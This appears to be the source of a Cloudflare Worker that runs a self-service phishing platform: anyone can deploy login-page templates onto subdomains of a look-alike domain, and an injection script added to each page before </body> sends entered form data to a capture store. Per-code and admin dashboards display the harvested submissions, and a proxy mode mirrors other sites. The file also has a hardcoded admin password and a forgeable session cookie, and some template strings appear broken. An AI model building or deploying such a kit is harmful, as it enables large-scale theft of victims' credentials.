import { INJECTION_SCRIPT_TEMPLATE } from './injection_template.js';

const ADMIN_PASSWORD = "admin-secret-123";
const ROOT_DOMAIN = "account-login.co.za";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const domain = url.hostname;
    let subdomain = null;

    // --- 1. SUBDOMAIN PARSING ---
    if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
        subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
    }

    // --- 2. ADMIN ROUTES (Protected) ---
    if (url.pathname.startsWith('/admin') || url.pathname.startsWith('/api/admin')) {

      // Login Page (Public)
      if (url.pathname === '/admin/login') {
          return new Response(renderLoginPage(), { headers: { 'Content-Type': 'text/html' } });
      }

      // Login API (Public)
      if (url.pathname === '/api/admin/login' && request.method === 'POST') {
          return handleAdminLoginApi(request);
      }

      // Check Auth
      const cookie = request.headers.get('Cookie');
      const isAuthenticated = cookie && cookie.includes('admin_session=true');

      // Protect everything else
      if (!isAuthenticated) {
          // If accessing page, redirect to login
          if (!url.pathname.startsWith('/api/')) {
               return Response.redirect(url.origin + '/admin/login', 302);
          }
          return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401, headers: { 'Content-Type': 'application/json' } });
      }

      // Admin Router
      if (url.pathname === '/admin') return new Response(renderAdminPanel(), { headers: { 'Content-Type': 'text/html' } });
      if (url.pathname === '/admin/captures') return new Response(renderCapturesDashboard(), { headers: { 'Content-Type': 'text/html' } });

      // API Routes
      if (url.pathname === '/api/admin/template' && request.method === 'POST') {
          return handleSaveTemplate(request, env);
      }
      if (url.pathname === '/api/admin/templates' && request.method === 'GET') {
          return handleListTemplates(env);
      }
      if (url.pathname === '/api/admin/script') {
          if (request.method === 'GET') return handleGetScript(env);
          if (request.method === 'POST') return handleSaveScript(request, env);
      }
      if (url.pathname === '/api/admin/captures' && request.method === 'GET') {
          return handleAdminGetCaptures(env);
      }
      // Re-enable original save endpoint for Proxy/HTML
      if (url.pathname === '/api/save' && request.method === 'POST') {
          return handleSaveRequest(request, env);
      }
    }

    // --- 3. PUBLIC API ROUTES ---
    if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
        return handlePublicDeploy(request, env);
    }
    if (url.pathname === '/api/public/captures') {
        return handlePublicCaptures(request, env);
    }
    if (url.pathname === '/api/capture') return handleCaptureRequest(request, env); // Keep existing for now

    // --- 4. SUBDOMAIN ROUTING ---
    if (subdomain && subdomain !== 'www') {
        return handleSubdomain(subdomain, env, request);
    }

    // --- 5. PUBLIC ROOT (Deploy Page) ---
    const templates = await listTemplates(env);
    return new Response(renderPublicPage(templates), { headers: { 'Content-Type': 'text/html' } });
  }
};

// --- AUTH HELPERS ---

async function handleAdminLoginApi(request) {
    try {
        const body = await request.json();
        if (body.password === ADMIN_PASSWORD) {
            // Set cookie
            return new Response(JSON.stringify({ success: true }), {
                headers: {
                    'Content-Type': 'application/json',
                    'Set-Cookie': 'admin_session=true; Path=/; HttpOnly; SameSite=Strict; Max-Age=86400' // 24 hours
                }
            });
        } else {
            return new Response(JSON.stringify({ success: false, error: 'Invalid Password' }), { status: 401 });
        }
    } catch (e) {
        return new Response(JSON.stringify({ success: false, error: 'Bad Request' }), { status: 400 });
    }
}

function renderLoginPage() {
    return `
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f9; }
        .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        input { padding: 10px; margin-bottom: 20px; width: 100%; box-sizing: border-box; }
        button { padding: 10px 20px; background: #0070f3; color: white; border: none; border-radius: 4px; cursor: pointer; width: 100%; }
        .error { color: red; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Admin Login</h2>
        <input type="password" id="password" placeholder="Enter Password">
        <button onclick="login()">Login</button>
        <div id="error" class="error"></div>
    </div>
    <script>
        async function login() {
            const password = document.getElementById('password').value;
            const res = await fetch('/api/admin/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password })
            });
            const data = await res.json();
            if (data.success) {
                window.location.href = '/admin';
            } else {
                document.getElementById('error').innerText = data.error;
                document.getElementById('error').style.display = 'block';
            }
        }
    </script>
</body>
</html>
    `;
}

// --- CORE HANDLERS ---

async function handleSubdomain(subdomain, env, request) {
    const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });

    if (!data) {
      return new Response(render404(subdomain), { status: 404, headers: { 'Content-Type': 'text/html' } });
    }

    if (data.type === 'HTML') {
      return new Response(data.content, {
        headers: { 'Content-Type': 'text/html' }
      });
    }

    if (data.type === 'PROXY') {
      try {
        const targetUrl = data.content;
        const url = new URL(request.url);
        const forwardUrl = new URL(targetUrl);
        forwardUrl.pathname = url.pathname === '/' ? forwardUrl.pathname : url.pathname;
        forwardUrl.search = url.search;

        const proxyResponse = await fetch(forwardUrl.toString(), {
          headers: {
            'User-Agent': request.headers.get('User-Agent') || 'D-TECH Cloud Proxy',
          }
        });

        return new Response(proxyResponse.body, proxyResponse);
      } catch (err) {
        return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
      }
    }

    return new Response("Configuration Error: Unknown Type", { status: 500 });
}

// Keep existing capture logic for now (will be updated in Step 8)
async function handleCaptureRequest(request, env) {
  try {
    const body = await request.json();
    const timestamp = Date.now();
    const uuid = crypto.randomUUID();
    // Use uniqueCode if present, else fallback
    const key = body.uniqueCode
        ? `capture::${body.uniqueCode}::${timestamp}::${uuid}`
        : `capture::unknown::${timestamp}::${uuid}`;

    await env.SUBDOMAINS.put(key, JSON.stringify({
      timestamp: timestamp,
      data: body
    }));

    return new Response(JSON.stringify({ success: true, key: key }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

// --- UI RENDERERS (Placeholders / Existing) ---

function render404(subdomain) {
  return \`<html><body style="text-align:center; font-family: sans-serif; padding: 50px;">
    <h1>404 - Subdomain Not Found</h1>
    <p>The subdomain <strong>\${subdomain}</strong> is not configured.</p>
  </body></html>\`;
}

function renderPublicPage(templates) {
    const templateOptions = templates.map(t => `<option value="${t}">${t}</option>`).join('');

    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D-TECH Cloud Public</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #0070f3; text-align: center; }
        .section { margin-bottom: 40px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
        .section:last-child { border-bottom: none; }
        h2 { color: #555; font-size: 1.2rem; margin-bottom: 15px; }
        input, select { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        button { background: #0070f3; color: #fff; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; transition: background 0.2s; }
        button:hover { background: #005bb5; }
        .delete-btn { background: #d32f2f; width: auto; padding: 6px 12px; font-size: 14px; margin: 0;}
        .delete-btn:hover { background: #b71c1c; }
        #message { padding: 15px; margin-bottom: 20px; border-radius: 4px; display: none; text-align: center; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { text-align: left; padding: 10px; border-bottom: 1px solid #eee; vertical-align: top; }
        th { background: #fafafa; }
        pre { background: #f4f4f4; padding: 8px; border-radius: 4px; overflow-x: auto; font-size: 13px; max-height: 150px; margin: 0; }
        .admin-link { text-align: right; font-size: 0.9em; margin-bottom: 20px; }
        .admin-link a { color: #666; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="admin-link"><a href="/admin">Admin Login &rarr;</a></div>
        <h1>🚀 D-TECH Cloud Public</h1>

        <div id="message"></div>

        <!-- DEPLOY SECTION -->
        <div class="section">
            <h2>1. Deploy Your Own Site</h2>
            <p>Select a template and create your unique code.</p>

            <select id="deploy-template">
                <option value="" disabled selected>Select a Template</option>
                ${templateOptions}
            </select>

            <input type="text" id="deploy-subdomain" placeholder="Desired Subdomain (e.g., my-login)">
            <input type="text" id="deploy-code" placeholder="Create a Unique Code (Your Secret Key)">

            <button onclick="deploy()">Deploy Site</button>
        </div>

        <!-- DASHBOARD SECTION -->
        <div class="section">
            <h2>2. View Your Captured Data</h2>
            <p>Enter your unique code to view data from your deployments.</p>

            <input type="password" id="view-code" placeholder="Enter your Unique Code">
            <button onclick="viewData()">View Data</button>

            <div id="data-area" style="display:none; margin-top: 20px;">
                <h3 id="data-title">Captured Data</h3>
                <div style="overflow-x:auto;">
                    <table id="data-table">
                        <thead>
                            <tr>
                                <th style="width: 150px;">Time</th>
                                <th>Data</th>
                                <th style="width: 80px;">Action</th>
                            </tr>
                        </thead>
                        <tbody id="data-body"></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <script>
        function showMessage(text, type) {
            const el = document.getElementById('message');
            el.innerText = text;
            el.className = type;
            el.style.display = 'block';
            window.scrollTo(0, 0);
        }

        async function deploy() {
            const template = document.getElementById('deploy-template').value;
            const subdomain = document.getElementById('deploy-subdomain').value;
            const uniqueCode = document.getElementById('deploy-code').value;

            if (!template || !subdomain || !uniqueCode) {
                return showMessage('Please fill in all fields.', 'error');
            }

            try {
                const res = await fetch('/api/public/deploy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ template, subdomain, uniqueCode })
                });
                const data = await res.json();

                if (data.success) {
                    showMessage(\`Success! Your site is live at https://\${data.url}\`, 'success');
                } else {
                    showMessage(data.error, 'error');
                }
            } catch (err) {
                showMessage('Network Error: ' + err.message, 'error');
            }
        }

        async function viewData() {
            const code = document.getElementById('view-code').value;
            if (!code) return showMessage('Please enter your unique code.', 'error');

            try {
                // Fetch captured data
                const res = await fetch(\`/api/public/captures?code=\${encodeURIComponent(code)}\`);
                const data = await res.json();

                if (data.success) {
                    renderTable(data.captures, code);
                    document.getElementById('data-area').style.display = 'block';
                    showMessage('Data loaded.', 'success');
                } else {
                    showMessage(data.error, 'error');
                    document.getElementById('data-area').style.display = 'none';
                }
            } catch (err) {
                showMessage('Network Error: ' + err.message, 'error');
            }
        }

        function renderTable(captures, code) {
            const tbody = document.getElementById('data-body');
            tbody.innerHTML = '';

            if (captures.length === 0) {
                tbody.innerHTML = '<tr><td colspan="3">No data found yet.</td></tr>';
                return;
            }

            captures.forEach(item => {
                const tr = document.createElement('tr');

                const tdTime = document.createElement('td');
                tdTime.textContent = new Date(item.timestamp).toLocaleString();

                const tdData = document.createElement('td');
                const pre = document.createElement('pre');
                pre.textContent = JSON.stringify(item.data.formData || item.data, null, 2);
                tdData.appendChild(pre);

                const tdAction = document.createElement('td');
                const btn = document.createElement('button');
                btn.className = 'delete-btn';
                btn.textContent = 'Delete';
                btn.onclick = () => deleteCapture(item.key, code);
                tdAction.appendChild(btn);

                tr.appendChild(tdTime);
                tr.appendChild(tdData);
                tr.appendChild(tdAction);
                tbody.appendChild(tr);
            });
        }

        async function deleteCapture(key, code) {
            if (!confirm('Are you sure you want to delete this record?')) return;

            try {
                const res = await fetch('/api/public/captures', {
                    method: 'DELETE',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ key, code })
                });
                const data = await res.json();

                if (data.success) {
                    viewData(); // Refresh table
                } else {
                    alert('Error: ' + data.error);
                }
            } catch (err) {
                alert('Network Error');
            }
        }
    </script>
</body>
</html>
    `;
}

// Original Admin Panel (will be updated in Step 4)
function renderAdminPanel() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>D-TECH Cloud Admin</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #0070f3; }
        h2 { border-bottom: 1px solid #eee; padding-bottom: 10px; margin-top: 30px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], textarea, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        textarea { height: 150px; font-family: monospace; }
        button { background: #0070f3; color: #fff; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; margin-bottom: 10px; }
        button:hover { background: #005bb5; }
        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; }
        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; }
        .tab.active { border-bottom-color: #0070f3; color: #0070f3; font-weight: bold; }
        .hidden { display: none; }
        #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .nav-links { margin-bottom: 20px; text-align: right; }
        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; margin-left: 15px; }
        ul { list-style: none; padding: 0; }
        li { background: #fafafa; padding: 10px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
        li:last-child { border-bottom: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-links">
            <a href="/admin/captures">View Captures &rarr;</a>
            <a href="/">Public Page &rarr;</a>
        </div>
        <h1>🚀 Cloud Admin Panel</h1>

        <div class="tabs">
            <div class="tab active" onclick="switchTab('templates')">Templates</div>
            <div class="tab" onclick="switchTab('proxy')">Deploy Proxy</div>
            <div class="tab" onclick="switchTab('script')">Injection Script</div>
        </div>

        <div id="message"></div>

        <!-- TEMPLATES TAB -->
        <div id="templates-section" class="form-section">
            <div class="form-group">
                <label>New Template Name</label>
                <input type="text" id="tpl-name" placeholder="e.g. login-v1">
            </div>
            <div class="form-group">
                <label>HTML Content</label>
                <textarea id="tpl-content" placeholder="<html>...</html>"></textarea>
            </div>
            <button onclick="saveTemplate()">Save Template</button>

            <h2>Existing Templates</h2>
            <ul id="template-list">
                <li>Loading...</li>
            </ul>
        </div>

        <!-- PROXY TAB -->
        <div id="proxy-section" class="form-section hidden">
            <p>Deploy a subdomain that proxies to another URL.</p>
            <div class="form-group">
                <label>Subdomain</label>
                <input type="text" id="proxy-subdomain" placeholder="e.g., blog">
            </div>
            <div class="form-group">
                <label>Target URL</label>
                <input type="text" id="proxy-url" placeholder="https://example.com">
            </div>
            <button onclick="saveProxy()">Create Proxy</button>
        </div>

        <!-- SCRIPT TAB -->
        <div id="script-section" class="form-section hidden">
            <p>Master Injection Script. <code>{{UNIQUE_CODE}}</code> will be replaced.</p>
            <div class="form-group">
                <textarea id="script-content" style="height: 400px;"></textarea>
            </div>
            <button onclick="saveScript()">Update Script</button>
        </div>
    </div>

    <script>
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));

            // Activate
            if (tab === 'templates') {
                document.querySelectorAll('.tab')[0].classList.add('active');
                document.getElementById('templates-section').classList.remove('hidden');
                loadTemplates();
            } else if (tab === 'proxy') {
                document.querySelectorAll('.tab')[1].classList.add('active');
                document.getElementById('proxy-section').classList.remove('hidden');
            } else {
                document.querySelectorAll('.tab')[2].classList.add('active');
                document.getElementById('script-section').classList.remove('hidden');
                loadScript();
            }
        }

        function showMessage(text, type) {
            const el = document.getElementById('message');
            el.innerText = text;
            el.className = type;
            el.style.display = 'block';
            setTimeout(() => el.style.display = 'none', 5000);
        }

        // --- TEMPLATES ---
        async function saveTemplate() {
            const name = document.getElementById('tpl-name').value;
            const content = document.getElementById('tpl-content').value;
            if (!name || !content) return showMessage('Missing fields', 'error');

            const res = await fetch('/api/admin/template', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name, content })
            });
            const data = await res.json();
            if (data.success) {
                showMessage('Template saved!', 'success');
                loadTemplates();
            } else {
                showMessage(data.error, 'error');
            }
        }

        async function loadTemplates() {
            const res = await fetch('/api/admin/templates');
            const data = await res.json();
            const list = document.getElementById('template-list');
            list.innerHTML = '';
            if (data.success && data.templates.length > 0) {
                data.templates.forEach(t => {
                    const li = document.createElement('li');
                    li.textContent = t;
                    list.appendChild(li);
                });
            } else {
                list.innerHTML = '<li>No templates found.</li>';
            }
        }

        // --- PROXY ---
        async function saveProxy() {
            const subdomain = document.getElementById('proxy-subdomain').value;
            const content = document.getElementById('proxy-url').value;
            if (!subdomain || !content) return showMessage('Missing fields', 'error');

            const res = await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'PROXY', subdomain, content })
            });
            const data = await res.json();
            if (data.success) showMessage('Proxy deployed!', 'success');
            else showMessage(data.error, 'error');
        }

        // --- SCRIPT ---
        async function loadScript() {
            const res = await fetch('/api/admin/script');
            const data = await res.json();
            if (data.success) {
                document.getElementById('script-content').value = data.script;
            }
        }

        async function saveScript() {
            const content = document.getElementById('script-content').value;
            const res = await fetch('/api/admin/script', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content })
            });
            const data = await res.json();
            if (data.success) showMessage('Script updated!', 'success');
            else showMessage(data.error, 'error');
        }

        // Init
        loadTemplates();
    </script>
</body>
</html>
  `;
}

// Original Captures Dashboard (will be updated)
function renderCapturesDashboard() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Captured Data</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { margin-top: 0; color: #d32f2f; }
        .nav-links { margin-bottom: 20px; }
        .nav-links a { color: #0070f3; text-decoration: none; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { text-align: left; padding: 12px; border-bottom: 1px solid #eee; vertical-align: top;}
        th { background: #fafafa; color: #555; }
        tr:hover { background: #f9f9f9; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; font-size: 13px; max-height: 200px; margin: 0; }
        .empty { text-align: center; color: #888; padding: 40px; }
        .timestamp { color: #666; font-size: 0.9em; white-space: nowrap; }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-links">
            <a href="/admin">&larr; Back to Admin Panel</a>
        </div>
        <h1>🕵️ All Captured Data Logs</h1>
        <p>Real-time data captured from ALL injected pages.</p>

        <div id="loading">Loading data...</div>
        <table id="data-table" style="display:none;">
            <thead>
                <tr>
                    <th style="width: 180px;">Time</th>
                    <th>Unique Code</th>
                    <th>Data Payload</th>
                </tr>
            </thead>
            <tbody id="table-body">
            </tbody>
        </table>
    </div>

    <script>
        async function loadData() {
            try {
                const response = await fetch('/api/admin/captures');
                const result = await response.json();

                if (result.success) {
                    renderTable(result.data);
                } else {
                    document.getElementById('loading').innerText = 'Error loading data: ' + result.error;
                }
            } catch (err) {
                document.getElementById('loading').innerText = 'Network Error: ' + err.message;
            }
        }

        function renderTable(data) {
            const tbody = document.getElementById('table-body');
            const table = document.getElementById('data-table');
            const loading = document.getElementById('loading');

            loading.style.display = 'none';
            table.style.display = 'table';
            tbody.innerHTML = '';

            if (data.length === 0) {
                tbody.innerHTML = '<tr><td colspan="3" class="empty">No captured data yet.</td></tr>';
                return;
            }

            data.forEach(item => {
                const row = document.createElement('tr');

                // Format timestamp
                const date = new Date(item.timestamp);
                const timeStr = date.toLocaleString();

                // Extract code from key if possible
                // key format: capture::{code}::{timestamp}::{uuid}
                const parts = item.key.split('::');
                const uniqueCode = parts.length >= 2 ? parts[1] : 'Unknown';

                // Format JSON data safely
                const jsonStr = JSON.stringify(item.data, null, 2);

                const timeCell = document.createElement('td');
                timeCell.className = 'timestamp';
                timeCell.textContent = timeStr;

                const codeCell = document.createElement('td');
                codeCell.textContent = uniqueCode;

                const dataCell = document.createElement('td');
                const pre = document.createElement('pre');
                pre.textContent = jsonStr;
                dataCell.appendChild(pre);

                row.appendChild(timeCell);
                row.appendChild(codeCell);
                row.appendChild(dataCell);

                tbody.appendChild(row);
            });
        }

        // Load on start
        loadData();
    </script>
</body>
</html>
  `;
}

// --- KV HELPERS ---

async function getTemplate(name, env) {
    return await env.SUBDOMAINS.get(`template::${name}`);
}

async function saveTemplate(name, content, env) {
    await env.SUBDOMAINS.put(`template::${name}`, content);
}

async function listTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    return list.keys.map(k => k.name.replace("template::", ""));
}

async function reserveCode(code, subdomain, env) {
    const existing = await env.SUBDOMAINS.get(`code::${code}`);
    if (existing) {
        throw new Error("Code already taken");
    }
    await env.SUBDOMAINS.put(`code::${code}`, JSON.stringify({
        subdomain: subdomain,
        created_at: Date.now()
    }));
}

async function checkCode(code, env) {
    return await env.SUBDOMAINS.get(`code::${code}`, { type: "json" });
}

async function getCaptures(code, env) {
    const prefix = `capture::${code}::`;
    const list = await env.SUBDOMAINS.list({ prefix: prefix });
    const keys = list.keys.reverse().slice(0, 50);

    const promises = keys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    return await Promise.all(promises);
}

async function saveCapture(code, data, env) {
     const timestamp = Date.now();
     const uuid = crypto.randomUUID();
     const key = `capture::${code}::${timestamp}::${uuid}`;
     await env.SUBDOMAINS.put(key, JSON.stringify({
        timestamp: timestamp,
        data: data
     }));
     return key;
}

async function deleteCapture(key, env) {
    await env.SUBDOMAINS.delete(key);
}

async function getInjectionScript(env) {
    const script = await env.SUBDOMAINS.get('system::injection_script');
    return script || INJECTION_SCRIPT_TEMPLATE;
}

async function saveInjectionScript(content, env) {
    await env.SUBDOMAINS.put('system::injection_script', content);
}

async function handleSaveTemplate(request, env) {
    try {
        const body = await request.json();
        if (!body.name || !body.content) throw new Error("Missing fields");
        await saveTemplate(body.name, body.content, env);
        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return new Response(JSON.stringify({ success: false, error: e.message }), { status: 400 });
    }
}

async function handleListTemplates(env) {
    try {
        const templates = await listTemplates(env);
        return new Response(JSON.stringify({ success: true, templates }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return new Response(JSON.stringify({ success: false, error: e.message }), { status: 500 });
    }
}

async function handleGetScript(env) {
    const script = await getInjectionScript(env);
    return new Response(JSON.stringify({ success: true, script }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleSaveScript(request, env) {
    try {
        const body = await request.json();
        if (!body.content) throw new Error("Missing content");
        await saveInjectionScript(body.content, env);
        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
    } catch (e) {
        return new Response(JSON.stringify({ success: false, error: e.message }), { status: 400 });
    }
}

async function handlePublicDeploy(request, env) {
    try {
        const body = await request.json();
        const { template, subdomain, uniqueCode } = body;

        if (!template || !subdomain || !uniqueCode) {
            throw new Error("Missing fields");
        }

        // Validate subdomain format (alphanumeric, hyphens)
        if (!/^[a-z0-9-]+$/.test(subdomain)) {
            throw new Error("Invalid subdomain format. Use lowercase letters, numbers, and hyphens.");
        }

        // Reserved names
        if (['www', 'admin', 'api', 'dashboard'].includes(subdomain)) {
             throw new Error("Subdomain reserved.");
        }

        // Check availability
        const existingSub = await env.SUBDOMAINS.get(subdomain);
        if (existingSub) throw new Error("Subdomain already taken.");

        const existingCode = await checkCode(uniqueCode, env);
        if (existingCode) throw new Error("Unique Code already in use. Please choose another.");

        // Get Template
        const htmlContent = await getTemplate(template, env);
        if (!htmlContent) throw new Error("Template not found.");

        // Get Script & Inject
        let script = await getInjectionScript(env);
        script = script.replace('{{UNIQUE_CODE}}', uniqueCode);

        // Inject script into HTML
        // Simple injection before </body>, or append if not found
        let finalHtml = htmlContent;
        if (finalHtml.includes('</body>')) {
            finalHtml = finalHtml.replace('</body>', `<script>${script}</script></body>`);
        } else {
            finalHtml += `<script>${script}</script>`;
        }

        // Save Subdomain
        await env.SUBDOMAINS.put(subdomain, JSON.stringify({
            type: 'HTML',
            content: finalHtml,
            owner_code: uniqueCode,
            created_at: Date.now()
        }));

        // Reserve Code
        await reserveCode(uniqueCode, subdomain, env);

        return new Response(JSON.stringify({
            success: true,
            url: `${subdomain}.${ROOT_DOMAIN}`
        }), { headers: { 'Content-Type': 'application/json' } });

    } catch (e) {
        return new Response(JSON.stringify({ success: false, error: e.message }), { status: 400 });
    }
}

async function handlePublicCaptures(request, env) {
    const url = new URL(request.url);

    if (request.method === 'GET') {
        const code = url.searchParams.get('code');
        if (!code) return new Response(JSON.stringify({ success: false, error: "Missing code" }), { status: 400 });

        try {
            const captures = await getCaptures(code, env);
            return new Response(JSON.stringify({ success: true, captures }), { headers: { 'Content-Type': 'application/json' } });
        } catch (e) {
            return new Response(JSON.stringify({ success: false, error: e.message }), { status: 500 });
        }
    }

    if (request.method === 'DELETE') {
        try {
            const body = await request.json();
            const { key, code } = body;
            if (!key || !code) return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });

            // Verify key belongs to code
            if (!key.startsWith(`capture::${code}::`)) {
                 return new Response(JSON.stringify({ success: false, error: "Invalid key for this code" }), { status: 403 });
            }

            await deleteCapture(key, env);
            return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
        } catch (e) {
            return new Response(JSON.stringify({ success: false, error: e.message }), { status: 500 });
        }
    }

    return new Response("Method Not Allowed", { status: 405 });
}

async function handleAdminGetCaptures(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
    const keys = list.keys.reverse().slice(0, 50);

    const promises = keys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const data = await Promise.all(promises);
    return new Response(JSON.stringify({ success: true, data }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleSaveRequest(request, env) {
  try {
    const body = await request.json();
    const { subdomain, type, content } = body;

    if (!subdomain || !type || !content) {
      return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });
    }

    const entry = {
      type: type, // 'HTML' or 'PROXY'
      content: content,
      updated: Date.now()
    };

    await env.SUBDOMAINS.put(subdomain, JSON.stringify(entry));

    return new Response(JSON.stringify({ success: true, subdomain, type }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}
